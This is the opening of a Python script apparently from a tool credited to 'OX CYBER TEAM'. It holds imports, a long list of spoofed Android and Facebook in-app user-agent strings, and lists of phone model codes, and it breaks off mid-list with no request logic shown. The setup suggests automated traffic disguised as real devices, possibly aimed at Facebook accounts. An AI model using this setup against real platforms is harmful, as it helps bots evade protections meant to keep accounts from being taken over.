#======SC SEND BY : KALYAN KING
#======TELIGERM : OX CYBER TEAM
import os,time
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel

from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON = sol()

#------------------[ SAED ]-------------------#

import os, platform, time, sys

ua = []
ua.append('Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114')
ua.append('Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111')
ua.append('Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
ua.append('Mozilla/5.0 (Linux; Android 8; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
ua.append('Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104')
ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102')
ua.append('Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]')
ua.append('Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111')
ua.append('Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104')
ua.append('Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108')
ua.append('Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63')
ua.append('Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]')
ua.append('Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]')
ua.append('Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]')
ua.append('Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]')
ua.append('Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]')
ua.append('Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]')
ua.append('Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]')
ua.append('Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52')
ua.append('Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]')
ua.append('Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]')
ua.append('Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]')
ua.append('Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]')
ua.append('Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]')
ua.append('Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]')
ua.append('Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]')
ua.append('Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]')
ua.append('Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]')
ua.append('Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]')
ua.append('Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]')
ua.append('Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]')
ua.append('Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537')
ua.append('Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]')
ua.append('Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]')
ua.append('Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]')
ua.append('Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]')
ua.append('Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]')
ua.append('Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]')
ua.append('Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]')
ua.append('Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]')
ua.append('Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4')
ua.append('Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]')
ua.append('Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]')
ua.append('Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]')
ua.append('Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]')
ua.append('Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]')
ua.append('Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]')
ua.append('Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36')
ua.append('Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]')

for xd in range(10000):
    pass

build_nokiax = ['JDQ39', 'JZO54K']
oppo = ['CPH1869', 'CPH1929', 'CPH2107', 'CPH2238', 'CPH2389', 'CPH2401', 'CPH2407', 'CPH2413', 'CPH2415', 'CPH2417', 'CPH2419', 'CPH2455', 'CPH2459', 'CPH2461', 'CPH2471', 'CPH2473', 'CPH2477', 'CPH8893', 'CPH2321', 'CPH2341', 'CPH2373', 'CPH2083', 'CPH2071', 'CPH2077', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH1923', 'CPH1925', 'CPH1837', 'CPH2015', 'CPH2073', 'CPH2081', 'CPH2029', 'CPH2031', 'CPH2137', 'CPH1605', 'CPH1803', 'CPH1853', 'CPH1805', 'CPH1809', 'CPH1851', 'CPH1931', 'CPH1959', 'CPH1933', 'CPH1935', 'CPH1943', 'CPH2061', 'CPH2069', 'CPH2127', 'CPH2131', 'CPH2139', 'CPH2135', 'CPH2239', 'CPH2195', 'CPH2273', 'CPH2325', 'CPH2309', 'CPH1701', 'CPH2387', 'CPH1909', 'CPH1920', 'CPH1912', 'CPH1901', 'CPH1903', 'CPH1905', 'CPH1717', 'CPH1801', 'CPH2067', 'CPH2099', 'CPH2161', 'CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH2339', 'CPH1715', 'CPH2385', 'CPH1729', 'CPH1827', 'CPH1938', 'CPH1937', 'CPH1939', 'CPH1941', 'CPH2001', 'CPH2021', 'CPH2059', 'CPH2121', 'CPH2123', 'CPH2203', 'CPH2333', 'CPH2365', 'CPH1913', 'CPH1911', 'CPH1915', 'CPH1969', 'CPH2209', 'CPH1987', 'CPH2095', 'CPH2119', 'CPH2285', 'CPH2213', 'CPH2223', 'CPH2363', 'CPH1609', 'CPH1613', 'CPH1723', 'CPH1727', 'CPH1725', 'CPH1819', 'CPH1821', 'CPH1825', 'CPH1881', 'CPH1823', 'CPH1871', 'CPH1875', 'CPH2023', 'CPH2005', 'CPH2025', 'CPH2207', 'CPH2173', 'CPH2307', 'CPH2305', 'CPH2337', 'CPH1955', 'CPH1707', 'CPH1719', 'CPH1721', 'CPH1835', 'CPH1831', 'CPH1833', 'CPH1879', 'CPH1893', 'CPH1877', 'CPH1607', 'CPH1611', 'CPH1917', 'CPH1919', 'CPH1907', 'CPH1989', 'CPH1945', 'CPH1951', 'CPH2043', 'CPH2035', 'CPH2037', 'CPH2036', 'CPH2009', 'CPH2013', 'CPH2113', 'CPH2091', 'CPH2125', 'CPH2109', 'CPH2089', 'CPH2065', 'CPH2159', 'CPH2145', 'CPH2205', 'CPH2201', 'CPH2199', 'CPH2217', 'CPH1921', 'CPH2211', 'CPH2235', 'CPH2251', 'CPH2249', 'CPH2247', 'CPH2237', 'CPH2371', 'CPH2293', 'CPH2353', 'CPH2343', 'CPH2359', 'CPH2357', 'CPH2457', 'CPH1983', 'CPH1979']
redmi = ['2201116SI', 'M2012K11AI', '22011119TI', '21091116UI', 'M2102K1AC', 'M2012K11I', '22041219I', '22041216I', '2203121C', '2106118C', '2201123G', '2203129G', '2201122G', '2201122C', '2206122SC', '22081212C', '2112123AG', '2112123AC', '2109119BC', 'M2002J9G', 'M2007J1SC', 'M2007J17I', 'M2102J2SC', 'M2007J3SY', 'M2007J17G', 'M2007J3SG', 'M2011K2G', 'M2101K9AG ', 'M2101K9R', '2109119DG', 'M2101K9G', '2109119DI', 'M2012K11G', 'M2102K1G', '21081111RG', '2107113SG', '21051182G', 'M2105K81AC', 'M2105K81C', '21061119DG', '21121119SG', '22011119UY', '21061119AG', '21061119AL', '22041219NY', '22041219G', '21061119BI', '220233L2G', '220233L2I', '220333QNY', '220333QAG', 'M2004J7AC', 'M2004J7BC', 'M2004J19C', 'M2006C3MII', 'M2010J19SI', 'M2006C3LG', 'M2006C3LVG', 'M2006C3MG', 'M2006C3MT', 'M2006C3MNG', 'M2006C3LII', 'M2010J19SL', 'M2010J19SG', 'M2010J19SY', 'M2012K11AC', 'M2012K10C', 'M2012K11C', '22021211RC']
realme = ['RMX3516', 'RMX3371', 'RMX3461', 'RMX3286', 'RMX3561', 'RMX3388', 'RMX3311', 'RMX3142', 'RMX2071', 'RMX1805', 'RMX1809', 'RMX1801', 'RMX1807', 'RMX1803', 'RMX1825', 'RMX1821', 'RMX1822', 'RMX1833', 'RMX1851', 'RMX1853', 'RMX1827', 'RMX1911', 'RMX1919', 'RMX1927', 'RMX1971', 'RMX1973', 'RMX2030', 'RMX2032', 'RMX1925', 'RMX1929', 'RMX2001', 'RMX2061', 'RMX2063', 'RMX2040', 'RMX2042', 'RMX2002', 'RMX2151', 'RMX2163', 'RMX2155', 'RMX2170', 'RMX2103', 'RMX3085', 'RMX3241', 'RMX3081', 'RMX3151', 'RMX3381', 'RMX3521', 'RMX3474', 'RMX3471', 'RMX3472', 'RMX3392', 'RMX3393', 'RMX3491', 'RMX1811', 'RMX2185', 'RMX3231', 'RMX2189', 'RMX2180', 'RMX2195', 'RMX2101', 'RMX1941', 'RMX1945', 'RMX3063', 'RMX3061', 'RMX3201', 'RMX3203', 'RMX3261', 'RMX3263', 'RMX3193', 'RMX3191', 'RMX3195', 'RMX3197', 'RMX3265', 'RMX3268', 'RMX3269', 'RMX2027', 'RMX2020', 'RMX2021', 'RMX3581', 'RMX3501', 'RMX3503', 'RMX3511', 'RMX3310', 'RMX3312', 'RMX3551', 'RMX3301', 'RMX3300', 'RMX2202', 'RMX3363', 'RMX3360', 'RMX3366', 'RMX3361', 'RMX3031', 'RMX3370', 'RMX3357', 'RMX3560', 'RMX3562', 'RMX3350', 'RMX2193', 'RMX2161', 'RMX2050', 'RMX2156', 'RMX3242', 'RMX3171', 'RMX3430', 'RMX3235', 'RMX3506', 'RMX2117', 'RMX2173', 'RMX3161', 'RMX2205', 'RMX3462', 'RMX3478', 'RMX3372', 'RMX3574', 'RMX1831', 'RMX3121', 